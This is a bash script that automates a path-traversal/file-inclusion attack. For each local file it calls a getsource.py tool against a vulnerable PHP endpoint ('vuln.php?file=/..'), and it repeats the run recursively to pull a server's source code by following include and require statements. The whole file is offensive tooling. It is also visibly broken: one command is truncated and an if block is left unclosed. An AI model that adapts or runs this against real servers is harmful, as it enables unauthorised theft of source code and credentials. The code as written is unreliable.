#!/bin/bash

:'

@Author: CybeRazor
@Title: execpy.sh
@Date: 19/05/2019
@License: GPLv3

@Description:
Bash automated executor of getsource.py script (fetching "include" and "require" keywords)
for each file in dirs and subdirs

It executes getsource.py for each file found in the current directory, and if subdirs
are found, it recursively re-execute itself inside of them, and of course it re-execute
itself 10 times because new files are downloaded in any execution of the python script,
which are not left unscanned

@Usage:
$ chmod +x execpy.sh
$ ./execpy.sh

'

# if no arguments, getting files list from current directory
if [[ $# -eq 0 ]]; then
	i=0
	# executing itself 10 times
	while [ $i -lt 10 ]; do
		# initializing directory array
		dirs=()
		for l in $(ls); do
			# if current element is a directory, adding it to the array
			if [ -d $l ]; then
				dirs+=($l)
			# if it's a file, executing the python script passing it as -f argument
			elif [ -f $l ]; then
				python getsource.py -s http://vulnerablesite.example/vuln.php?file=/.. -w include -f $l
				python getsource.py -s http://vulnerablesite.example/vuln.php?file=/.. -w require -f $l
			fi
		done
		# for each dir in the array, re-execute this script passing the directory as argument
		for d in ${dirs[@]}; do
			./execpy.sh $d
		done
		let "i++"
	done
# if script has arguments, setting the first as directory to scan
else
	dir_fetch=$1
	# initializing subdirectory array
	subdir=()
	for line in $(ls $dir_fetch); do
		# if current element is a directory, adding it to the array
		if [ -d $dir_fetch/$line ]; then
			subdir+=($dir_fetch/$line)
		# if it's a file, executing the python script passing it as -f argument
		elif [ -f $dir_fetch/$line ]; then
			python getsource.py -s http://vulnerablesite.example/vuln.php?file=/.. -w include -f $dir_fetch/$line
			python getsource.py -s http://vulnerablesite.example/vuln.php?file=/..
	done
	# for each subdir in the array, re-execute this script passing the subdirectory as argument
	for ln in ${subdir[@]}; do
		./execpy.sh $ln
	done
fi
